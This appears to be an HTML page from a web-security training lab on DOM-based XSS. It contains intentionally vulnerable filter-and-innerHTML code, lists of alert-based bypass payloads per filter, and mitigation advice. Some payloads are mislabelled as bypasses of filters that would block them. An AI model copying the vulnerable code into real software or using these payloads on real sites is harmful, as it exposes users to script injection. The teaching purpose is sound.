<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: Advanced DOM XSS with Filters</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">

    <style>
        :root {
            --primary-dark: #1a1f36;
            --primary-light: #2d3748;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .demo-section {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            border-left: 4px solid var(--accent-green);
        }

        .filter-display {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 6px;
            padding: 1rem;
            margin: 1rem 0;
            font-family: monospace;
            word-break: break-all;
        }

        .output-display {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 6px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 3px solid var(--accent-orange);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .filter-form {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .bypass-examples {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to DOM XSS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: Advanced DOM XSS with Filters</h1>
            <p class="hero-subtitle">Client-side XSS with filter bypass techniques</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced DOM XSS vulnerabilities where various filtering mechanisms are implemented but can be bypassed. The application applies different filters to user input but still allows XSS through creative bypass techniques.</p>
            <p><strong>Objective:</strong> Bypass the implemented filters and inject DOM XSS payloads that will execute despite the security measures.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable JavaScript Code
                    </div>
                    <div class="card-body">
                        <pre>
// Multiple filter implementations
function applyFilters(input, filterType) {
    switch(filterType) {
        case 'script_tag':
            // Filter: Block script tags
            return input.replace(/&lt;script[^&gt;]*&gt;.*?&lt;\/script&gt;/gi, '[BLOCKED]');
            
        case 'event_handlers':
            // Filter: Block event handlers
            return input.replace(/on\w+\s*=/gi, 'blocked_');
            
        case 'javascript_protocol':
            // Filter: Block javascript: protocol
            return input.replace(/javascript:/gi, 'blocked_javascript:');
            
        case 'case_sensitive':
            // Filter: Case-sensitive blocking
            return input.replace(/&lt;script&gt;/g, '[BLOCKED]');
            
        case 'double_encode':
            // Filter: Basic double encoding detection
            if (input.includes('%')) {
                return '[ENCODING DETECTED]';
            }
            return input;
            
        default:
            return input;
    }
}

// Vulnerable processing function
function processInput() {
    var input = document.getElementById('userInput').value;
    var filterType = document.getElementById('filterType').value;
    
    // Apply filter
    var filteredInput = applyFilters(input, filterType);
    
    // Vulnerable: Still using innerHTML
    document.getElementById('output').innerHTML = 
        '&lt;div class="result"&gt;' +
        '&lt;h3&gt;Filtered Input:&lt;/h3&gt;' +
        '&lt;p&gt;' + filteredInput + '&lt;/p&gt;' +
        '&lt;h3&gt;Original Input:&lt;/h3&gt;' +
        '&lt;p&gt;' + input + '&lt;/p&gt;' +
        '&lt;/div&gt;';
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Live Demo
                    </div>
                    <div class="card-body">
                        <div class="filter-form">
                            <h6><i class="bi bi-funnel me-2"></i>Filter Test:</h6>
                            <div class="mb-3">
                                <label for="filterType" class="form-label">Filter Type:</label>
                                <select class="form-select" id="filterType">
                                    <option value="none">No Filter</option>
                                    <option value="script_tag">Script Tag Filter</option>
                                    <option value="event_handlers">Event Handlers Filter</option>
                                    <option value="javascript_protocol">JavaScript Protocol Filter</option>
                                    <option value="case_sensitive">Case Sensitive Filter</option>
                                    <option value="double_encode">Double Encode Filter</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="userInput" class="form-label">Input:</label>
                                <input type="text" class="form-control" id="userInput" placeholder="Enter your payload...">
                            </div>
                            <button class="btn btn-primary" onclick="processInput()">Test Filter</button>
                        </div>
                        
                        <div class="demo-section">
                            <h6><i class="bi bi-exclamation-triangle me-2"></i>Filtered Output:</h6>
                            <div class="output-display" id="output">
                                <script>
                                    // Initialize with default message
                                    document.getElementById('output').innerHTML = 'No input provided. Try testing a payload!';
                                </script>
                            </div>
                        </div>
                        
                        <div class="bypass-examples">
                            <h6><i class="bi bi-shield-exclamation me-2"></i>Bypass Examples:</h6>
                            <p>Try these payloads with different filters:</p>
                            <ul>
                                <li><code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code> - Case bypass</li>
                                <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code> - Event handler bypass</li>
                                <li><code>&lt;svg onload=alert('XSS')&gt;</code> - SVG bypass</li>
                                <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code> - Protocol bypass</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced DOM XSS with Filter Bypasses</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Source:</strong> User input with various filters</li>
                        <li><strong>Sink:</strong> <code>innerHTML</code></li>
                        <li><strong>Trigger:</strong> Filter bypass techniques</li>
                        <li><strong>Issue:</strong> Inadequate filtering mechanisms</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Payloads by Filter</h5>
                    <p><strong>Script Tag Filter Bypasses:</strong></p>
                    <ul>
                        <li><code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code></li>
                        <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                        <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
                    </ul>
                    <p><strong>Event Handlers Filter Bypasses:</strong></p>
                    <ul>
                        <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                        <li><code>&lt;body onload=alert('XSS')&gt;</code></li>
                        <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
                    </ul>
                    <p><strong>JavaScript Protocol Filter Bypasses:</strong></p>
                    <ul>
                        <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                        <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
                        <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code></li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Advanced Attack Scenarios</h5>
            <ul>
                <li>Bypassing WAF and security filters</li>
                <li>Advanced social engineering attacks</li>
                <li>Protocol confusion attacks</li>
                <li>Encoding-based filter evasion</li>
                <li>Context-aware XSS attacks</li>
                <li>Client-side security control bypasses</li>
                <li>Multi-stage payload delivery</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Advanced Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Use <code>textContent</code> instead of <code>innerHTML</code></li>
                    <li>Implement multiple layers of validation and sanitization</li>
                    <li>Use whitelist-based validation instead of blacklists</li>
                    <li>Normalize and canonicalize input before validation</li>
                    <li>Implement proper context-aware output encoding</li>
                    <li>Use Content Security Policy (CSP) headers</li>
                    <li>Regular security testing and filter updates</li>
                    <li>Consider using a WAF (Web Application Firewall)</li>
                    <li>Implement proper input validation libraries</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        // Multiple filter implementations
        function applyFilters(input, filterType) {
            switch(filterType) {
                case 'script_tag':
                    // Filter: Block script tags
                    return input.replace(/<script[^>]*>.*?<\/script>/gi, '[BLOCKED]');
                    
                case 'event_handlers':
                    // Filter: Block event handlers
                    return input.replace(/on\w+\s*=/gi, 'blocked_');
                    
                case 'javascript_protocol':
                    // Filter: Block javascript: protocol
                    return input.replace(/javascript:/gi, 'blocked_javascript:');
                    
                case 'case_sensitive':
                    // Filter: Case-sensitive blocking
                    return input.replace(/<script>/g, '[BLOCKED]');
                    
                case 'double_encode':
                    // Filter: Basic double encoding detection
                    if (input.includes('%')) {
                        return '[ENCODING DETECTED]';
                    }
                    return input;
                    
                default:
                    return input;
            }
        }

        // Vulnerable processing function
        function processInput() {
            var input = document.getElementById('userInput').value;
            var filterType = document.getElementById('filterType').value;
            
            if (!input) {
                document.getElementById('output').innerHTML = 'No input provided. Try testing a payload!';
                return;
            }
            
            // Apply filter
            var filteredInput = applyFilters(input, filterType);
            
            // Vulnerable: Still using innerHTML
            document.getElementById('output').innerHTML = 
                '<div class="result">' +
                '<h3>Filtered Input:</h3>' +
                '<p>' + filteredInput + '</p>' +
                '<h3>Original Input:</h3>' +
                '<p>' + input + '</p>' +
                '</div>';
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
        crossorigin="anonymous"></script>
</body>
</html>
